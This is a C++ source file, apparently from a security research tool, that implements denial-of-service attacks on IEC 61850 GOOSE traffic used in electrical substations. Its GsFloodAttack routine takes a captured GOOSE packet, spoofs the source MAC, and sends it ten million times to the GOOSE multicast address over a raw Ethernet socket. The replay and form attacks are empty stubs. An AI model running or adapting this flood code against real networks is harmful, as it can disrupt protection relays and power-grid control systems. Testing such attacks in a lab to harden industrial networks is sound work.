/***********************************************************
 * Author: Wen Li
 * Date  : 11/08/2019
 * Describe: packet capture from interface
 * History:
   <1> 11/08/2019 , create
************************************************************/
#include "GsAttack.h"


DosAttack *SinglDos::m_DosAttack = NULL;


VOID DosAttack::CaptureGoose (GsEthPacket *Gs)
{
    m_GsPackets.push_back(Gs);
}


DWORD DosAttack::GetCapPktNum ()
{
    return m_GsPackets.size();
}

VOID DosAttack::SetAttType (ATTACK_TYPE AttType)
{
    m_AttackType = AttType;
}


VOID DosAttack::PossibleFormAttack()
{
    return;
}

VOID DosAttack::SendPacket(EthernetSocket *socket,char *msg,int len)
{

    if(*socket!=0)
    {
        Ethernet_sendPacket(*socket,(uint8_t*)msg,len);
    }

}

VOID DosAttack::GsFloodAttack()
{
    DWORD len;
    BYTE *msg;
    m_GsPackets[0]->SetSrcMac((BYTE*)"112233");
    len = m_GsPackets[0]->GetPacketData(&msg);

    uint8_t des[7]={0x01, 0x0c, 0xcd, 0x01, 0x00, 0x01};
    EthernetSocket socket=Ethernet_createSocket(this->Device.c_str(),des);
    long num=0;
    time_t t;
    time(&t);
    
    for(long i=0;i<10000000;i++)
    {
        this->SendPacket(&socket,(char*)msg, (int)len);
        for(int i=0;i<2000;i++)
            num++;
    }
    time_t tx;
    time(&tx);
    FILE *f=fopen("time.txt","w");
    fprintf(f,"%d",tx-t);
    fclose(f);
    return;
}

VOID DosAttack::GsReplayAttack()
{
    return;
}


VOID DosAttack::Attack(string Device)
{
    this->Device=Device;
    switch (m_AttackType)
    {
        
        case ATTACK_GS_FLOOD:
        {
            GsFloodAttack();
            break;
        }
        case ATTACK_PB_FORM:
        {
            PossibleFormAttack();
            break;
        }
        case ATTACK_GS_REPLAY:
        {
            GsReplayAttack();
            break;
        }
        default:
        {
            break;
        }
    }

    return;
}


